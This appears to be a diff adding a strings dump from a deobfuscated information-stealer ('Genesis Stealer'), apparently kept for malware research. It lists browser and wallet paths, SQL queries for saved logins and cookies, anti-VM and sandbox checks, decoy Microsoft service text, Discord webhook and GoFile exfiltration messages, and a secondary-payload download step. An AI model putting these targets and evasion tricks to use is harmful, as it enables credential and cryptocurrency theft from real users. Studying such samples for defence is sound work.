@@ -1,0 +1,611 @@
+\t
+\n
+\n\n
+\n[1/7] Terminating browser processes...
+\n[2/7] Preparing temporary directory...
+\n[3/7] Collecting data...
+\n[4/7] Creating archive...
+\n[5/7] Sending system information...
+\n[6/7] Sending data summary...
+\n[7/7] Uploading data archive...
+\n[BONUS] Downloading secondary payload...
+\nCleaning up...
+\n═══════════════════════════════════════════════════════════
+  - ${gpu.name} (${gpu.vram})
+\n
+ /F /F /IM 
+ GB
+ K
+"${payloadPath}"
+#
+# Netscape HTTP Cookie File
+# This is a generated file! Do not edit.
+\n
+${STRINGS.GENESIS_SOCIETY} | ${STRINGS.GENESIS_KEY}
+${cookie.domain}\tTRUE\t${cookie.path}\t${cookie.secure ? 'TRUE' : 'FALSE'}\t${cookie.expires}\t${cookie.name}\t${cookie.value}
+\n
+${days}d ${hours}h ${minutes}m
+${stats.cookies || 0} cookies extracted
+${stats.minecraft || 0} Minecraft\n${stats.lunar || 0} LunarClient
+${stats.passwords || 0} passwords extracted
+${stats.tokens || 0} tokens found
+${stats.wallets || 0} wallets detected
+${stats.wifi || 0} networks
+%
+**CPU:** ${systemInfo.cpu.model}\n**Cores:** ${systemInfo.cpu.cores}\n**RAM:** ${systemInfo.ram.total} (${systemInfo.ram.usagePercent} used)
+**Hostname:** ${systemInfo.hostname}\n**Username:** ${systemInfo.username}\n**OS:** ${systemInfo.version}\n**Uptime:** ${systemInfo.uptime}
+**IP:** ${ipInfo.ip}\n**Country:** ${ipInfo.country}\n**City:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}
+,
+--disable-dev-shm-usage
+--disable-gpu
+--headless
+--no-sandbox
+--remote-debugging-port=
+--remote-debugging-port=${debugPort}
+--user-data-dir=
+--user-data-dir=${userDataPath}
+.json
+.ldb
+.log
+.lunarclient
+.minecraft
+.txt
+.zip
+7Star Browser
+7Star\\7Star\\User Data
+7star
+7star.exe
+@GenesisSociety
+@ben10grabber
+APPDATA
+All Users
+Antivirus Enabled: ${defenderStatus.antivirusEnabled}\nReal-Time Protection: ${defenderStatus.realTimeProtection}\nBehavior Monitoring: ${defenderStatus.behaviorMonitoring}\n\n
+AppData
+AppData\\Local\\360Chrome\\Chrome\\User Data
+AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State
+AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data
+AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State
+AppData\\Local\\Chromium\\User Data
+AppData\\Local\\Chromium\\User Data\\Local State
+AppData\\Local\\CocCoc\\Browser\\User Data
+AppData\\Local\\CocCoc\\Browser\\User Data\\Local State
+AppData\\Local\\Google\\Chrome Beta\\User Data
+AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State
+AppData\\Local\\Google\\Chrome\\User Data
+AppData\\Local\\Google\\Chrome\\User Data\\Local State
+AppData\\Local\\Microsoft\\Edge\\User Data
+AppData\\Local\\Microsoft\\Edge\\User Data\\Local State
+AppData\\Local\\Tencent\\QQBrowser\\User Data
+AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State
+AppData\\Local\\Vivaldi\\User Data
+AppData\\Local\\Vivaldi\\User Data\\Local State
+AppData\\Local\\Yandex\\YandexBrowser\\User Data
+AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State
+AppData\\Roaming\\Mozilla\\Firefox\\Profiles
+AppData\\Roaming\\Opera Software\\Opera GX Stable
+AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State
+AppData\\Roaming\\Opera Software\\Opera Stable
+AppData\\Roaming\\Opera Software\\Opera Stable\\Local State
+Archive created:
+Armory
+Atomic
+Atomic Wallet
+Authorization
+Avast
+Avail
+Auro
+Backpack
+Backup
+Beacon
+Ben10
+Bifrost
+Binance
+Binance Wallet
+BitBox
+BitDefender
+BitKeep
+Bitcoin
+Bitcoin Core
+BoltX
+Bookmarks
+Braavos
+Brave
+Brave Browser
+Brave Softwarekey1
+Brave Wallet
+BraveSoftware\\Brave-Browser\\User Data
+Browser termination complete
+Browser-Datas
+Browser_Wallets
+Browser_Wallets
+BROWSER WALLETS (${results.browserWallets.length})\n
+Bytecoin
+C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll
+C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
+C:\\Program Files\\Mozilla Firefox\\nss3.dll
+C:\\Users
+C:\\\\Program Files (x86)\\\\AVG
+C:\\\\Program Files (x86)\\\\Avast Software
+C:\\\\Program Files (x86)\\\\BitDefender
+C:\\\\Program Files (x86)\\\\ESET
+C:\\\\Program Files (x86)\\\\Kaspersky Lab
+C:\\\\Program Files (x86)\\\\Malwarebytes
+C:\\\\Program Files (x86)\\\\McAfee
+C:\\\\Program Files (x86)\\\\Norton
+C:\\\\Program Files (x86)\\\\Sophos
+C:\\\\Program Files\\\\AVG
+C:\\\\Program Files\\\\Avast Software
+C:\\\\Program Files\\\\BitDefender
+C:\\\\Program Files\\\\ESET
+C:\\\\Program Files\\\\Kaspersky Lab
+C:\\\\Program Files\\\\Malwarebytes
+C:\\\\Program Files\\\\McAfee
+C:\\\\Program Files\\\\Norton
+C:\\\\Program Files\\\\Sophos
+CPU: ${systemInfo.cpu.model} (${systemInfo.cpu.cores} cores @ ${systemInfo.cpu.speed} MHz)\n
+CRITICAL: v20 data found but key appears invalid. This usually means 'app_bound_encrypted_key' is missing from Local State.
+Cache
+Casper Signer
+CentBrowser
+CentBrowser\\User Data
+Chrome
+Chromium
+Chromium\\User Data
+Chromiumkey1
+Client
+Clover
+CocCoc Browser
+CocCoc Browserkey1
+Coin98
+Coinbase Wallet
+Coinomi
+Cold_Wallets
+COLD WALLETS (${results.coldWallets.length})\n
+Compass
+Content-Type
+Cookies
+Core
+Cosmostation
+Creating data archive:
+Credit Cards
+Crypto.Cipher
+CurrentUser
+Cyano
+DECRYPT_FAILED
+Daedalus
+Dash
+Dash Core
+DashCore
+Data collection complete!
+Decipher
+Decryption failed for {login[0]}: {decrypted}
+Deep folder found: ${deepFolder}
+Default
+Default User
+Desktop
+Desktop Wallets: ${results.desktopWallets.length}\n
+Desktop_Wallets
+Discord
+Discord Backup Codes
+Discord Backup Codes Found
+Discord webhook sent successfully
+Documents
+Dogecoin
+Dogecoin Core
+Downloaded
+Downloading secondary payload:
+Downloads
+Duration: N/A
+ESET
+EVER Wallet
+Edge
+Edge_Passwords.txt
+Edge extraction error:
+Electrum
+Electrum\\wallets
+Electron app ready - Calling startApp
+Enkrypt
+Epic Privacy Browser
+Epic Privacy Browser\\User Data
+Error
+Error checking process ${processName}:
+Error copying directory ${source}:
+Error creating archive:
+Error downloading payload:
+Error during stealer execution:
+Error executing payload:
+Error extracting Discord tokens:
+Error extracting Firefox cookies:
+Error extracting LunarClient data:
+Error extracting Minecraft data:
+Error extracting Opera GX cookies:
+Error extracting WiFi passwords:
+Error extracting autofill:
+Error extracting cookies:
+Error extracting passwords:
+Error getting IP info:
+Error getting cookies from headless browser:
+Error getting installed software:
+Error getting processes:
+Error in NSS_Init: {e}
+Error launching headless browser:
+Error processing autofill: {e}
+Error processing cookies: {e}
+Error processing logins: {e}
+Error processing {name}: {e}
+Error reading Firefox cookies:
+Error reading cookies:
+Error reading passwords:
+Error reading user directories:
+Error sending Discord webhook:
+Error sending file to Discord:
+Error uploading to GoFile:
+Error writing file ${filePath}:
+Errors: N/A
+Eternl
+Ethereum
+Ethereum Wallet
+Ethereum\\wallets
+Eternl
+Execution has been DISABLED for safety.
+Exodus
+Exodus Desktop
+Extension
+Extension Settings
+Extracted {len(bookmarks)} bookmarks
+Extracted {len(cards)} credit cards
+Extracted {len(history)} history items
+Extracting Discord tokens...
+Extracting browser data...
+Extracting cryptocurrency wallets...
+Extracting gaming data...
+FALSE
+Failed
+Failed to get GoFile server
+Failed to kill ${processName}
+Failed to load NSS from {path}: {e}
+False
+Fatal error: ${error.message}
+Fatal error: ${error.message}\n${error.stack}
+Features:\n- System diagnostics\n- Performance optimization\n- Update management\n\n© Microsoft Corporation. All rights reserved.
+Field: {name}\nValue: {value_str}\n\n
+File sent to Discord successfully
+File: ${path.basename(res.filePath)}\nCodes: ${res.codes.join(', ')}
+File: {result.filePath}
+Finnie
+Firefox
+Firefox Beta
+Firefox Developer
+Firefox ESR
+Firefox Nightly
+Firefox
+Flint Wallet
+Fordefi
+Found
+Found deep folder: ${deepFolder}
+Found {len(autofills)} autofill entries
+Found {len(cookies)} cookies
+Found {len(logins)} logins
+Found {len(profiles)} profiles
+Frame
+Frontier
+GPU:\n
+Gathering system information...
+Generated: ${results.timestamp.toISOString()}\n\n
+Genesis
+Genesis (Minecraft)
+Genesis Stealer - Operation Complete
+Genesis Stealer - Starting Operation
+Get-MpComputerStatus
+GetBilling
+Getting GoFile server...
+Goby
+GoFile upload failed
+Google Chrome
+Google Chrome Beta
+Google Chrome Betakey1
+Google Chromekey1
+Google\\Chrome\\User Data
+Guarda
+Guild
+HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters
+HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions
+HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools
+HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest
+HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse
+HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService
+HKLM\\SYSTEM\\ControlSet001\\Services\\vmci
+HKLM\\SYSTEM\\ControlSet001\\Services\\vmhgfs
+Harmony
+Hostname: ${systemInfo.hostname}\nUsername: ${systemInfo.username}\nPlatform: ${systemInfo.platform}\nArchitecture: ${systemInfo.arch}\nWindows Version: ${systemInfo.version}\nUptime: ${systemInfo.uptime}\n\n
+ICONex
+IP Address: ${ipInfo.ip}\nCountry: ${ipInfo.country}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nISP: ${ipInfo.isp}\nTimezone: ${ipInfo.timezone}\n\n
+IPv4
+Initializing NSS for profile: {profile_path}
+IndexedDB
+InputPayload finished
+InputPayload.main()
+Iridium
+Iridium\\User Data
+Jaxx Liberty
+K3y59tfty
+KB
+KardiaChain
+Kaspersky
+KeepKey
+Keplr
+KEY: dQw4w9WgXcQ
+KeepKey
+Kometa
+Kometa\\User Data
+Kukai
+LOCALAPPDATA
+Leather (Hiro)
+Ledger
+Ledger Live
+Ledger Live
+Legitimate Routine finished
+Litecoin
+Litecoin Core
+Liquality
+Liquality Wallet
+Loading NSS from {path}
+Local
+Local Extension Settings
+Local State
+Local Storage
+Login Data
+Login Data For Account
+Login Data New
+Login Data
+Login prefix: {login[2][:3]}
+Logs
+LunarClient
+MAC check failed
+MB
+MEW CX
+MSVCP140.dll
+MSVCR100.dll
+Mac
+Main started
+Maiar DeFi
+Malwarebytes
+Martian Aptos
+Martian Wallet
+Math Wallet
+McAfee
+MetaMask
+Metamask
+Microsoft
+Microsoft Corporation. All rights reserved.
+Microsoft Edge
+Microsoft Edgekey1
+Microsoft\\Edge\\User Data
+Minecraft
+Monero
+Mozilla Firefox
+Mozilla\\Firefox\\Profiles
+MultiBit
+Music
+N/A
+NSS_Init failed with code {ret}
+Nabox
+Name\tURL\n
+Nami
+Netscape HTTP Cookie File
+Network
+Nifty
+No Badges
+No Billing
+No Billing
+No cert DB found in {profile_path}, skipping NSS init
+No cookie DB found
+No login DB found
+No webdata DB found
+Node environment detected - Calling startApp
+None
+Noone
+Norton
+OKX Wallet
+OWallet
+OneKey
+OneKey (Legacy)
+Open
+Opera
+Opera GX
+Opera GX Stable
+Opera Software
+Opera Software\\Opera GX Stable
+Opera Software\\Opera Stable
+Opera Softwarekey1
+Opera Wallet
+Opera
+Orbitum
+Orbitum\\User Data
+PATH
+Passwords
+Payload downloaded:
+Payload executed successfully
+Petra Aptos
+Phantom
+Pictures
+PolkadotJS
+Polymesh
+Polymesh Wallet
+Pontem Aptos
+Preferences
+Profile
+Profile 1
+Profile 2
+Profile 3
+Profile 4
+Profile 5
+Public
+QQ Browser
+QQ Browserkey1
+QQBrowser.exe
+Rainbow
+Rabby Wallet
+Roaming
+Ronin Wallet
+Running payload...
+Running security checks...
+SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;
+SELECT name, value FROM autofill;
+SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;
+SELECT origin_url, username_value, password_value FROM logins
+SSID: ${wifi.ssid}\nPassword: ${wifi.password}\n───────────────────────────────────────────────────────────\n
+SUMMARY\n
+SafePal
+Safepal Extension
+Saturn
+Saved ${allPasswords.length} Edge passwords to ${outFile}
+Sender
+Sender Wallet
+Slope
+Slope Finance
+Sophos
+Spire
+Sputnik
+Sputnik\\User Data
+Stack trace: ${error.stack}
+Stargazer
+Starting InputPayload...
+Starting InputPayload.main()...
+Starting Windows System Service...
+Starting app execution...
+Step 1/7: Checking for virtual machine...
+SubWallet
+Subwallet Polkadot
+Successfully
+Successfully decrypted {success_count} cookies
+Successfully decrypted {success_count} passwords
+Successfully killed ${processName}
+Success: N/A
+Sui Wallet
+System Error
+System Volume Information
+System diagnostics completed
+System diagnostics running
+SystemDrive
+SystemService_README.txt
+TEMP
+TRUE
+TRUE
+Taho (Tally Ho)
+Talisman
+Temple
+Terra Station
+Terminating browser processes...
+The program can't start because ${randomDll} is missing from your computer. Try reinstalling the program to fix this problem.
+This is a deobfuscated malware file for research purposes.
+To analyze behavior in a VM, uncomment the execution line above.
+Token ${index + 1}: ${token}\n
+TokenPocket
+Total Codes: {result.codeCount}
+Total Files Found: ${results.length}
+Total Unique Codes: ${results.reduce((sum, r) => sum + r.codeCount, 0)}
+Total Wallets Found: ${totalWallets}\n
+Total logs: N/A
+TronLink
+Trust Wallet
+Trezor
+Trezor Suite
+Trezor Suite
+URL\tTitle\tVisit Count\tLast Visit\n
+URL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: ${password}\nProfile: ${profile}\n-------------------
+URL: {login[0]}\nUsername: {login[1]}\nPassword: {decrypted}\n\n
+URL: {pass.url}\nUsername: {pass.username}\nPassword: {pass.password}\n───────────────────────────────────────────────────────────\n
+USERPROFILE
+Umami
+Unknown
+Unknown AV
+Unknown GPU
+Uploaded
+Uploading file to GoFile...
+Uran
+URL: {login[0]}\nUsername: {login[1]}\nPassword: {decrypted}\n\n
+Using server: ${server}
+V139_cookies.exe
+VCRUNTIME140.dll
+VM Detected, exiting
+Vivaldi
+Vivaldi\\User Data
+Vivaldikey1
+WALLET EXTRACTION SUMMARY\n
+WALLET.DAT FILES (${results.walletDatFiles.length})\n
+WScript.Shell
+WALLET.DAT FILES (${results.walletDatFiles.length})\n
+Wallet.dat Files: ${results.walletDatFiles.length}\n
+WalletDat_Files
+WalletWasabi
+Wallets
+Warning
+Wasabi
+Web Data
+Windows
+Windows Defender
+Windows System Service\nVersion: 1.0.0\n\nThis is a system maintenance service that helps keep your system running smoothly.\n\n
+WindowsSystemService
+Wombat
+XDEFI Wallet
+Xverse
+Yandex Browser
+Yandex Browserkey1
+Yandex\\YandexBrowser\\User Data
+Yoroi
+Zcash
+Zerion
+[AntiVM] All checks passed - real system
+[AntiVM] Analysis directory detected: ${dir}
+[AntiVM] Analysis hostname detected: ${hostname}
+[AntiVM] Analysis username detected: ${username}
+[AntiVM] DETECTED: ${check.name}
+[AntiVM] Debugger process detected: ${proc}
+[AntiVM] Error in ${check.name}: ${e.message}
+[AntiVM] Low CPU cores: ${os.cpus().length}
+[AntiVM] Low RAM: ${totalRAM.toFixed(2)}GB
+[AntiVM] Low network interfaces: ${count}
+[AntiVM] Low process count: ${procCount}
+[AntiVM] Low screen width: ${width}
+[AntiVM] Low temp files: ${tempFiles.length}
+[AntiVM] Sandbox process detected: ${proc}
+[AntiVM] Sleep patching detected: ${actualSleep}ms vs ${requestedSleep}ms
+[AntiVM] Starting anti-VM/sandbox checks...
+[AntiVM] VM disk detected: ${diskModel.trim()}
+[AntiVM] VM file detected: ${file}
+[AntiVM] VM registry key found: ${key}
+[AntiVM] VM/Sandbox detected - exiting
+[FUD] Using deterministic deep folder: ${deepFolder}
+[FUD] Using fallback deep folder: ${fallbackDir}
+_cookies.txt
+_genesis_
+_passwords.txt
+_systeminfo.txt
+_tokens.txt
+_wallets.txt
+abcdefghijklmnopqrstuvwxyz0123456789
+accounts.json
+acmacodkjbdgmoleebolmdjonilkdbch
+adm-zip
+aeachknmefphepccionboohckonoeemg
+aes-256-gcm
+afbcbjpbpfadlkmhmclhkeeodmamcflc
+agoakfejjabomempkjlepdflaleeobhb
+aholpfdialjgjfhomihkjbmgjidlcdno
+aflkmfhebedbjioipglgcbcmnbpgliof
+aiifbnbfobpmeekipheeijimdpnlpgpp
+all
+amkmjjmmflddogmhpjloimipbofnfjih
+anokgmphncpekkhclmingpimjmcooifb
+aodkkagnadcbobfpggfnjeongemjbjca
+application/json
+arch
+archiver
+armory
+arraybuffer
+atomic
+author
+autofill
+auto_fills.txt
